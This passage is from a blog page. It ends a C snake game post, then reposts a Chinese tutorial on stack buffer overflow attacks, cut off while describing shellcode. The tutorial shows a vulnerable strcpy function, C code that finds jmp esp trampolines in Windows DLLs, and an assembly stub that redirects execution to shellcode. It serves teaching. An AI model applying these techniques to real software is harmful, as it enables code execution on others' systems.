class="params">()</span></span>;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">endGame</span><span class="params">()</span></span>;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">bitself</span><span class="params">()</span></span>;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">crosswall</span><span class="params">()</span></span>;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">gameControl</span><span class="params">()</span></span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">init</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; length; ++i)</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="keyword">for</span> (<span class="keyword">int</span> j = <span class="number">0</span>; j &lt; width; ++j)</span><br><span class="line">		&#123;</span><br><span class="line">			<span class="keyword">if</span> (<span class="built_in">map</span>[i][j] == <span class="number">1</span>)</span><br><span class="line">			&#123;</span><br><span class="line">				<span class="built_in">printf</span>(<span class="string">"■"</span>);</span><br><span class="line">			&#125;</span><br><span class="line">			<span class="keyword">else</span></span><br><span class="line">			&#123;</span><br><span class="line">				<span class="built_in">printf</span>(<span class="string">"  "</span>);</span><br><span class="line">			&#125;			</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">"\n"</span>);</span><br><span class="line">	&#125;	</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//create map</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">createMap</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; length; ++i)</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="keyword">for</span> (<span class="keyword">int</span> j = <span class="number">0</span>; j &lt; width; ++j)</span><br><span class="line">		&#123;</span><br><span class="line">			<span class="keyword">if</span> (i == <span class="number">0</span> || j == <span class="number">0</span> || i== length<span class="number">-1</span> || j == width - <span class="number">1</span>)</span><br><span class="line">			&#123;</span><br><span class="line">				<span class="built_in">map</span>[i][j] = <span class="number">1</span>;</span><br><span class="line">			&#125;</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">"\n"</span>);</span><br><span class="line">	&#125;	</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//create Snake</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">createSnake</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	snake *tail;</span><br><span class="line">	<span class="keyword">int</span> i;</span><br><span class="line">	tail = (snake*)<span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(snake));</span><br><span class="line">	tail-&gt;x = length / <span class="number">2</span>;</span><br><span class="line">	tail-&gt;y = width / <span class="number">2</span>;</span><br><span class="line">	tail-&gt;next = <span class="literal">NULL</span>;</span><br><span class="line">	<span class="keyword">for</span> (i = <span class="number">1</span>; i &lt;= <span class="number">3</span>; i++)</span><br><span class="line">	&#123;</span><br><span class="line">		head = (snake*)<span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(snake));</span><br><span class="line">		head-&gt;next = tail;</span><br><span class="line">		head-&gt;x = length / <span class="number">2</span> +  i;</span><br><span class="line">		head-&gt;y = width / <span class="number">2</span>;</span><br><span class="line">		tail = head;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">while</span> (tail != <span class="literal">NULL</span>)</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="built_in">map</span>[tail-&gt;x][tail-&gt;y] = <span class="number">1</span>;</span><br><span class="line">		tail = tail-&gt;next;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">//makefood</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">makeFood</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	srand(time(<span class="literal">NULL</span>));</span><br><span class="line">	food[<span class="number">0</span>] = rand() % (length - <span class="number">2</span>) + <span class="number">1</span>;</span><br><span class="line">	food[<span class="number">1</span>] = rand() % (width - <span class="number">2</span>) + <span class="number">1</span>;</span><br><span class="line">	<span class="built_in">map</span>[food[<span class="number">0</span>]][food[<span class="number">1</span>]] = <span class="number">1</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//bitself</span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">bitself</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	snake *self;</span><br><span class="line">	self = head-&gt;next;</span><br><span class="line">	<span class="keyword">while</span> (self != <span class="literal">NULL</span>)</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="keyword">if</span> (self-&gt;x == head-&gt;x &amp;&amp; self-&gt;y == head-&gt;y)</span><br><span class="line">		&#123;</span><br><span class="line">			<span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">		&#125;</span><br><span class="line">		self = self-&gt;next;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//cross wall</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">crossWall</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="keyword">if</span> (head-&gt;x == <span class="number">0</span> || head-&gt;x == length - <span class="number">1</span> || </span><br><span class="line">		head-&gt;y == <span class="number">0</span> || head-&gt;y == width - <span class="number">1</span>)</span><br><span class="line">	&#123;</span><br><span class="line">		endGame();</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">move</span><span class="params">(snake * nextthead)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="keyword">if</span> (nextthead-&gt;x == food[<span class="number">0</span>] &amp;&amp; nextthead-&gt;y == food[<span class="number">1</span>])</span><br><span class="line">	&#123;</span><br><span class="line">		nextthead-&gt;next = head;</span><br><span class="line">		head = nextthead;</span><br><span class="line">		snake *q = head;</span><br><span class="line">		<span class="keyword">while</span> (q -&gt;next!= <span class="literal">NULL</span>)</span><br><span class="line">		&#123;</span><br><span class="line">			<span class="built_in">map</span>[q-&gt;x][q-&gt;y] = <span class="number">1</span>;</span><br><span class="line">			q = q-&gt;next;</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="built_in">map</span>[q-&gt;x][q-&gt;y] = <span class="number">0</span>;</span><br><span class="line">		makeFood();</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">else</span></span><br><span class="line">	&#123;</span><br><span class="line">		nextthead-&gt;next = head;</span><br><span class="line">		head = nextthead;</span><br><span class="line">		snake *q = head;</span><br><span class="line">		<span class="keyword">while</span> (q-&gt;next-&gt;next != <span class="literal">NULL</span>)</span><br><span class="line">		&#123;</span><br><span class="line">			<span class="built_in">map</span>[q-&gt;x][q-&gt;y] = <span class="number">1</span>;</span><br><span class="line">			q = q-&gt;next;</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="built_in">map</span>[q-&gt;next-&gt;x][q-&gt;next-&gt;y] = <span class="number">0</span>;</span><br><span class="line">		<span class="built_in">free</span>(q-&gt;next);</span><br><span class="line">		q-&gt;next = <span class="literal">NULL</span>;</span><br><span class="line">		<span class="built_in">map</span>[q-&gt;x][q-&gt;y] = <span class="number">0</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">if</span> (bitself())</span><br><span class="line">	&#123;</span><br><span class="line">		endGame();</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//snake move</span></span><br><span class="line"><span class="function"><span class="keyword">void</span>  <span class="title">snakeMove</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	snake *nextthead;</span><br><span class="line">	crosswall();</span><br><span class="line"></span><br><span class="line">	nextthead = (snake *)<span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(snake));</span><br><span class="line"></span><br><span class="line">	<span class="keyword">switch</span> (status)</span><br><span class="line">	&#123;</span><br><span class="line">	<span class="keyword">case</span> <span class="string">'w'</span>:</span><br><span class="line">		nextthead-&gt;x = head-&gt;x - <span class="number">1</span>;</span><br><span class="line">		nextthead-&gt;y = head-&gt;y;</span><br><span class="line">		move(nextthead);</span><br><span class="line">		<span class="keyword">break</span>;</span><br><span class="line">	<span class="keyword">case</span> <span class="string">'a'</span>:</span><br><span class="line">		nextthead-&gt;x = head-&gt;x;</span><br><span class="line">		nextthead-&gt;y = head-&gt;y - <span class="number">1</span>;</span><br><span class="line">		move(nextthead);</span><br><span class="line">		<span class="keyword">break</span>;</span><br><span class="line">	<span class="keyword">case</span> <span class="string">'s'</span>:</span><br><span class="line">		nextthead-&gt;x = head-&gt;x + <span class="number">1</span>;</span><br><span class="line">		nextthead-&gt;y = head-&gt;y;</span><br><span class="line">		move(nextthead);</span><br><span class="line">		<span class="keyword">break</span>;</span><br><span class="line">	<span class="keyword">case</span> <span class="string">'d'</span>:</span><br><span class="line">		nextthead-&gt;x = head-&gt;x;</span><br><span class="line">		nextthead-&gt;y = head-&gt;y + <span class="number">1</span>;</span><br><span class="line">		move(nextthead);</span><br><span class="line">		<span class="keyword">break</span>;</span><br><span class="line">	<span class="keyword">default</span>:</span><br><span class="line">		nextthead-&gt;x = head-&gt;x + <span class="number">1</span>;</span><br><span class="line">		nextthead-&gt;y = head-&gt;y;</span><br><span class="line">		move(nextthead);</span><br><span class="line">		<span class="keyword">break</span>;</span><br><span class="line">	&#125;	</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//cntrol game</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">gameControl</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="keyword">char</span> key = <span class="literal">NULL</span>;</span><br><span class="line">	<span class="keyword">if</span> (_kbhit())</span><br><span class="line">	&#123;</span><br><span class="line">		key = _getch();</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">switch</span> (key)</span><br><span class="line">	&#123;</span><br><span class="line">	<span class="keyword">case</span> <span class="string">'w'</span>:	<span class="comment">//up</span></span><br><span class="line">		status = <span class="string">'w'</span>;</span><br><span class="line">		<span class="keyword">break</span>;</span><br><span class="line">	<span class="keyword">case</span> <span class="string">'a'</span>:	<span class="comment">//left</span></span><br><span class="line">		status = <span class="string">'a'</span>;</span><br><span class="line">		<span class="keyword">break</span>;</span><br><span class="line">	<span class="keyword">case</span> <span class="string">'s'</span>:	<span class="comment">//down</span></span><br><span class="line">		status = <span class="string">'s'</span>;</span><br><span class="line">		<span class="keyword">break</span>;</span><br><span class="line">	<span class="keyword">case</span> <span class="string">'d'</span>:	<span class="comment">//right</span></span><br><span class="line">		status = <span class="string">'d'</span>;</span><br><span class="line">		<span class="keyword">break</span>;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">//end game</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">endGame</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	system(<span class="string">"cls"</span>);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">"Game Over"</span>);</span><br><span class="line">	system(<span class="string">"pause"</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//main function</span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	createMap();</span><br><span class="line">	createSnake();</span><br><span class="line">	makeFood();</span><br><span class="line">	init();</span><br><span class="line">	<span class="keyword">while</span> (<span class="number">1</span>)</span><br><span class="line">	&#123;</span><br><span class="line">		gameControl();</span><br><span class="line">		snakeMove();</span><br><span class="line">		Sleep(<span class="number">200</span>);</span><br><span class="line">		system(<span class="string">"cls"</span>);</span><br><span class="line">		init();</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
      
    </div>
    <footer class="entry-meta entry-footer">
      
	<span class="ico-folder"></span>
    <a class="article-category-link" href="/categories/c/">c</a>

      
  <span class="ico-tags"></span>
  <ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/c/">c</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/game/">game</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/贪吃蛇/">贪吃蛇</a></li></ul>

      
    </footer>
    <hr class="entry-footer-hr">
  </div>
  
</article>

<!-- Table of Contents -->

  
    <article id="post-2017-05-23-缓冲区溢出攻击"  class="article article-type-post" itemscope itemprop="blogPost" >
  <div id="articleInner" class="clearfix post-1016 post type-post status-publish format-standard has-post-thumbnail hentry category-template-2 category-uncategorized tag-codex tag-edge-case tag-featured-image tag-image tag-template">
    
    
      <header class="article-header">
        
  
    <h1 class="thumb" itemprop="name">
      <a class="article-title" href="/2017/05/23/2017-05-23-缓冲区溢出攻击/">缓冲区溢出攻击</a>
    </h1>
  

      </header>
    
    <div class="article-meta">
      
	<a href="/2017/05/23/2017-05-23-缓冲区溢出攻击/" class="article-date">
	  <time datetime="2017-05-22T16:00:00.000Z" itemprop="datePublished">五月 23, 2017</time>
	</a>

      
	<span class="ico-folder"></span>
    <a class="article-category-link" href="/categories/信息安全/">信息安全</a>
 
      
    </div>
    <div class="article-entry" itemprop="articleBody">
      
        <p>转载自<a href="http://www.cnblogs.com/fanzhidongyzby/archive/2013/08/10/3250405.html" target="_blank" rel="noopener">Florian</a><br>缓冲区溢出（Buffer Overflow）是计算机安全领域内既经典而又古老的话题。随着计算机系统安全性的加强，传统的缓冲区溢出攻击方式可能变得不再奏效，相应的介绍缓冲区溢出原理的资料也变得“大众化”起来。其中看雪的《0day安全：软件漏洞分析技术》一书将缓冲区溢出攻击的原理阐述得简洁明了。本文参考该书对缓冲区溢出原理的讲解，并结合实际的代码实例进行验证。不过即便如此，完成一个简单的溢出代码也需要解决很多书中无法涉及的问题，尤其是面对较新的具有安全特性的编译器——比如MS的Visual Studio2010。接下来，我们结合具体代码，按照对缓冲区溢出原理的循序渐进地理解方式去挖掘缓冲区溢出背后的底层机制。  </p>
<h1 id="一、代码-lt-gt-数据"><a href="#一、代码-lt-gt-数据" class="headerlink" title="一、代码 &lt;=&gt; 数据"></a>一、代码 &lt;=&gt; 数据</h1><p>顾名思义，缓冲区溢出的含义是为缓冲区提供了多于其存储容量的数据，就像往杯子里倒入了过量的水一样。通常情况下，缓冲区溢出的数据只会破坏程序数据，造成意外终止。但是如果有人精心构造溢出数据的内容，那么就有可能获得系统的控制权！如果说用户（也可能是黑客）提供了水——缓冲区溢出攻击的数据，那么系统提供了溢出的容器——缓冲区。<br>缓冲区在系统中的表现形式是多样的，高级语言定义的变量、数组、结构体等在运行时可以说都是保存在缓冲区内的，因此所谓缓冲区可以更抽象地理解为一段可读写的内存区域，缓冲区攻击的最终目的就是希望系统能执行这块可读写内存中已经被蓄意设定好的恶意代码。按照冯·诺依曼存储程序原理，程序代码是作为二进制数据存储在内存的，同样程序的数据也在内存中，因此直接从内存的二进制形式上是无法区分哪些是数据哪些是代码的，这也为缓冲区溢出攻击提供了可能。  </p>
<p><a href="http://wx3.sinaimg.cn/mw690/af2d2659ly1ffwau3ghkrj20ei0ir402.jpg" data-lightbox="roadtrip" target="_blank" rel="noopener"><br><img src="http://wx3.sinaimg.cn/mw690/af2d2659ly1ffwau3ghkrj20ei0ir402.jpg" class="img-fluid"><br></a></p>
<p><center>图1 进程地址空间分布</center><br>图1是进程地址空间分布的简单表示。代码存储了用户程序的所有可执行代码，在程序正常执行的情况下，程序计数器（PC指针）只会在代码段和操作系统地址空间（内核态）内寻址。数据段内存储了用户程序的全局变量，文字池等。栈空间存储了用户程序的函数栈帧（包括参数、局部数据等），实现函数调用机制，它的数据增长方向是低地址方向。堆空间存储了程序运行时动态申请的内存数据等，数据增长方向是高地址方向。除了代码段和受操作系统保护的数据区域，其他的内存区域都可能作为缓冲区，因此缓冲区溢出的位置可能在数据段，也可能在堆、栈段。如果程序的代码有软件漏洞，恶意程序会“教唆”程序计数器从上述缓冲区内取指，执行恶意程序提供的数据代码！本文分析并实现栈溢出攻击方式。  </p>
<h1 id="二、函数栈帧"><a href="#二、函数栈帧" class="headerlink" title="二、函数栈帧"></a>二、函数栈帧</h1><p>栈的主要功能是实现函数的调用。因此在介绍栈溢出原理之前，需要弄清函数调用时栈空间发生了怎样的变化。每次函数调用时，系统会把函数的返回地址（函数调用指令后紧跟指令的地址），一些关键的寄存器值保存在栈内，函数的实际参数和局部变量（包括数据、结构体、对象等）也会保存在栈内。这些数据统称为函数调用的栈帧，而且是每次函数调用都会有个独立的栈帧，这也为递归函数的实现提供了可能。  </p>
<p><a href="http://wx4.sinaimg.cn/mw690/af2d2659ly1ffwau3oikoj20y90g3dj1.jpg" data-lightbox="roadtrip" target="_blank" rel="noopener"><br><img src="http://wx4.sinaimg.cn/mw690/af2d2659ly1ffwau3oikoj20y90g3dj1.jpg" class="img-fluid"><br></a></p>
<p><center>图2 函数栈帧</center><br>如图所示，我们定义了一个简单的函数function，它接受一个整形参数，做一次乘法操作并返回。当调用function(0)时，arg参数记录了值0入栈，并将call function指令下一条指令的地址0x00bd16f0保存到栈内，然后跳转到function函数内部执行。每个函数定义都会有函数头和函数尾代码，如图绿框表示。因为函数内需要用ebp保存函数栈帧基址，因此先保存ebp原来的值到栈内，然后将栈指针esp内容保存到ebp。函数返回前需要做相反的操作——将esp指针恢复，并弹出ebp。这样，函数内正常情况下无论怎样使用栈，都不会使栈失去平衡。<br>sub esp,44h指令为局部变量开辟了栈空间，比如ret变量的位置。理论上，function只需要再开辟4字节空间保存ret即可，但是编译器开辟了更多的空间（这个问题很诡异，你觉得呢？）。函数调用结束返回后，函数栈帧恢复到保存参数0时的状态，为了保持栈帧平衡，需要恢复esp的内容，使用add esp,4将压入的参数弹出 。<br>之所以会有缓冲区溢出的可能，主要是因为栈空间内保存了函数的返回地址。该地址保存了函数调用结束后后续执行的指令的位置，对于计算机安全来说，该信息是很敏感的。如果有人恶意修改了这个返回地址，并使该返回地址指向了一个新的代码位置，程序便能从其它位置继续执行。  </p>
<h1 id="三、栈溢出基本原理"><a href="#三、栈溢出基本原理" class="headerlink" title="三、栈溢出基本原理"></a>三、栈溢出基本原理</h1><p>上边给出的代码是无法进行溢出操作的，因为用户没有“插足”的机会。但是实际上很多程序都会接受用户的外界输入，尤其是当函数内的一个数组缓冲区接受用户输入的时候，一旦程序代码未对输入的长度进行合法性检查的话，缓冲区溢出便有可能触发！比如下边的一个简单的函数。  </p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">fun</span><span class="params">(<span class="keyword">unsigned</span> <span class="keyword">char</span> *data)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">char</span> buffer[BUF_LEN];</span><br><span class="line">    <span class="built_in">strcpy</span>((<span class="keyword">char</span>*)buffer,(<span class="keyword">char</span>*)data);<span class="comment">//溢出点</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>这个函数没有做什么有“意义”的事情（这里主要是为了简化问题），但是它是一个典型的栈溢出代码。在使用不安全的strcpy库函数时，系统会盲目地将data的全部数据拷贝到buffer指向的内存区域。buffer的长度是有限的，一旦data的数据长度超过BUF_LEN，便会产生缓冲区溢出。  </p>
<p><a href="http://wx2.sinaimg.cn/mw690/af2d2659ly1ffwau3ulkpj20o00gp0vi.jpg" data-lightbox="roadtrip" target="_blank" rel="noopener"><br><img src="http://wx2.sinaimg.cn/mw690/af2d2659ly1ffwau3ulkpj20o00gp0vi.jpg" class="img-fluid"><br></a></p>
<p><center>图3 缓冲区溢出</center><br>由于栈是低地址方向增长的，因此局部数组buffer的指针在缓冲区的下方。当把data的数据拷贝到buffer内时，超过缓冲区区域的高地址部分数据会“淹没”原本的其他栈帧数据，根据淹没数据的内容不同，可能会有产生以下情况：  </p>
<ol>
<li>淹没了其他的局部变量。如果被淹没的局部变量是条件变量，那么可能会改变函数原本的执行流程。这种方式可以用于破解简单的软件验证。</li>
<li>淹没了ebp的值。修改了函数执行结束后要恢复的栈指针，将会导致栈帧失去平衡。</li>
<li>淹没了返回地址。这是栈溢出原理的核心所在，通过淹没的方式修改函数的返回地址，使程序代码执行“意外”的流程！</li>
<li>淹没参数变量。修改函数的参数变量也可能改变当前函数的执行结果和流程。</li>
<li>淹没上级函数的栈帧，情况与上述4点类似，只不过影响的是上级函数的执行。当然这里的前提是保证函数能正常返回，即函数地址不能被随意修改（这可能很麻烦！）。  </li>
</ol>
<p>如果在data本身的数据内就保存了一系列的指令的二进制代码，一旦栈溢出修改了函数的返回地址，并将该地址指向这段二进制代码的其实位置，那么就完成了基本的溢出攻击行为。  </p>
<p><a href="http://wx2.sinaimg.cn/mw690/af2d2659ly1ffwau42a46j20da0h70u1.jpg" data-lightbox="roadtrip" target="_blank" rel="noopener"><br><img src="http://wx2.sinaimg.cn/mw690/af2d2659ly1ffwau42a46j20da0h70u1.jpg" class="img-fluid"><br></a></p>
<p><center>图4 基本栈溢出攻击</center><br>通过计算返回地址内存区域相对于buffer的偏移，并在对应位置构造新的地址指向buffer内部二进制代码的其实位置，便能执行用户的自定义代码！这段既是代码又是数据的二进制数据被称为shellcode，因为攻击者希望通过这段代码打开系统的shell，以执行任意的操作系统命令——比如下载病毒，安装木马，开放端口，格式化磁盘等恶意操作。</p>
<h1 id="四、栈溢出攻击"><a href="#四、栈溢出攻击" class="headerlink" title="四、栈溢出攻击"></a>四、栈溢出攻击</h1><p>上述过程虽然理论上能完成栈溢出攻击行为，但是实际上很难实现。操作系统每次加载可执行文件到进程空间的位置都是无法预测的，因此栈的位置实际是不固定的，通过硬编码覆盖新返回地址的方式并不可靠。为了能准确定位shellcode的地址，需要借助一些额外的操作，其中最经典的是借助跳板的栈溢出方式。<br>根据前边所述，函数执行后，栈指针esp会恢复到压入参数时的状态，在图4中即data参数的地址。如果我们在函数的返回地址填入一个地址，该地址指向的内存保存了一条特殊的指令jmp esp——跳板。那么函数返回后，会执行该指令并跳转到esp所在的位置——即data的位置。我们可以将缓冲区再多溢出一部分，淹没data这样的函数参数，并在这里放上我们想要执行的代码！这样，不管程序被加载到哪个位置，最终都会回来执行栈内的代码。  </p>
<p><a href="http://wx2.sinaimg.cn/mw690/af2d2659ly1ffwau47z1gj20hs0h2mym.jpg" data-lightbox="roadtrip" target="_blank" rel="noopener"><br><img src="http://wx2.sinaimg.cn/mw690/af2d2659ly1ffwau47z1gj20hs0h2mym.jpg" class="img-fluid"><br></a></p>
<p><center>图5 借助跳板的栈溢出攻击</center><br>借助于跳板的确可以很好的解决栈帧移位（栈加载地址不固定）的问题，但是跳板指令从哪找呢？“幸运”的是，在Windows操作系统加载的大量dll中，包含了许多这样的指令，比如kernel32.dll，ntdll.dll，这两个动态链接库是Windows程序默认加载的。如果是图形化界面的Windows程序还会加载user32.dll，它也包含了大量的跳板指令！而且更“神奇”的是Windows操作系统加载dll时候一般都是固定地址，因此这些dll内的跳板指令的地址一般都是固定的。我们可以离线搜索出跳板执行在dll内的偏移，并加上dll的加载地址，便得到一个适用的跳板指令地址！  </p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//查询dll内第一个jmp esp指令的位置</span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">findJmp</span><span class="params">(<span class="keyword">char</span>*dll_name)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">char</span>* handle=(<span class="keyword">char</span>*)LoadLibraryA(dll_name);<span class="comment">//获取dll加载地址</span></span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> pos=<span class="number">0</span>;;pos++)<span class="comment">//遍历dll代码空间</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">if</span>(handle[pos]==(<span class="keyword">char</span>)<span class="number">0xff</span>&amp;&amp;handle[pos+<span class="number">1</span>]==(<span class="keyword">char</span>)<span class="number">0xe4</span>)<span class="comment">//寻找0xffe4 = jmp  esp</span></span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">return</span> (<span class="keyword">int</span>)(handle+pos);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>这里简化了搜索算法，输出第一个跳板指令的地址，读者可以选取其他更合适位置。LoadLibraryA库函数返回值就是dll的加载地址，然后加上搜索到的跳板指令偏移pos便是最终地址。jmp esp指令的二进制表示为0xffe4，因此搜索算法就是搜索dll内这样的字节数据即可。<br>虽然如此，上述的攻击方式还不够好。因为在esp后继续追加shellcode代码会将上级函数的栈帧淹没，这样做并没有什么好处，甚至可能会带来运行时问题。既然被溢出的函数栈帧内提供了缓冲区，我们还是把核心的shellcode放在缓冲区内，而在esp之后放上跳转指令转移到原本的缓冲区位置。由于这样做使代码的位置在esp指针之前，如果shellcode中使用了push指令便会让esp指令与shellcode代码越来越近，甚至淹没自身的代码。这显然不是我们想要的结果，因此我们可以强制抬高esp指针，使它在shellcode之前（低地址位置），这样就能在shellcode内正常使用push指令了。  </p>
<p><a href="http://wx3.sinaimg.cn/mw690/af2d2659ly1ffwau4d5fgj20j30h3jsm.jpg" data-lightbox="roadtrip" target="_blank" rel="noopener"><br><img src="http://wx3.sinaimg.cn/mw690/af2d2659ly1ffwau4d5fgj20j30h3jsm.jpg" class="img-fluid"><br></a></p>
<p><center>图6 调整shellcode与栈指针</center><br>调整代码的内容很简单：  </p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">add esp,-X</span><br><span class="line">jmp esp</span><br></pre></td></tr></table></figure>
<p>第一条指令抬高了栈指针到shellcode之前。X代表shellcode起始地址与esp的偏移。如果shellcode从缓冲区起始位置开始，那么就是buffer的地址偏移。这里不使用sub esp,X指令主要是避免X的高位字节为0的问题，很多情况下缓冲区溢出是针对字符串缓冲区的，如果出现字节0会导致缓冲区截断，从而导致溢出失败。<br>第二条指令就是跳转到shellcode的起始位置继续执行。（又是jmp esp！）<br>通过上述方式便能获得一个较为稳定的栈溢出攻击。</p>
<h1 id="五、shellcode构造"><a href="#五、shellcode构造" class="headerlink" title="五、shellcode构造"></a>五、shellcode构造</h1><p>shellcode实质是指溢出后执行的能开启系统shell的代码。但是在缓冲区溢出攻击时，也可以将整个触发缓冲区溢出攻击过程的代码统称为shellcode，按照这种定义可以把shellcode分为四部分：  </p>
<ol>
<li>核心shellcode代码，包含了攻击者要执行的所有代码。</li>
<li>溢出地址，是触发shellcode的关键所在。</li>
<li>填充物，填充未使用的缓冲区，用于控制溢出地址的位置，一般使用nop指令填充——0x90表示。</li>
<li>结束符号0，对于符号串shellcode需要用0结尾，避免溢出时字符串异常。</li>
</ol>
<p>前边一直在围绕溢出地址讨论，并解决了shellcode组织的问题，而最核心的代码如何构造并未提及——即攻击成功后做的事情。其实一旦缓冲区溢出攻击成功后，如果被攻击的程序有系统的root权限——比如系统服务程序，那么攻击者基本上可以为所欲为了！但是我们需要清楚的是，核心shellcode必须是二进制代码形式。而且shellcode执行时是在远程的计算机上，因此shellcode是否能通用是一个很复杂的问题。我们可以用一段简单的代码实例来说明这个问题 。<br>缓冲区溢出成功后，一般大家都会希望开启一个远程的shell控制被攻击的计算机。开启shell最直接的方式便是调用C语言的库函数system，该函数可以执行操作系统的命令，就像我们在命令行下执行命令那样。假如我们执行cmd命令——在远程计算机上启动一个命令提示终端（我们可能还不能和它交互，但是可以在这之前建立一个远程管道等），这里仅作为实例测试。<br>为了使system函数调用成功，我们需要将“cmd”字符串内容压入栈空间，并将其地址压入作为system函数的参数，然后使用call指令调用system函数的地址，完成函数的执行。但是这样做还不够，如果被溢出的程序没有加载C语言库的话，我们还需要调用Windows的API Loadlibrary加载C语言的库msvcrt.dll，类似的我们也需要为字符串“msvcrt.dll”开辟栈空间。  </p>
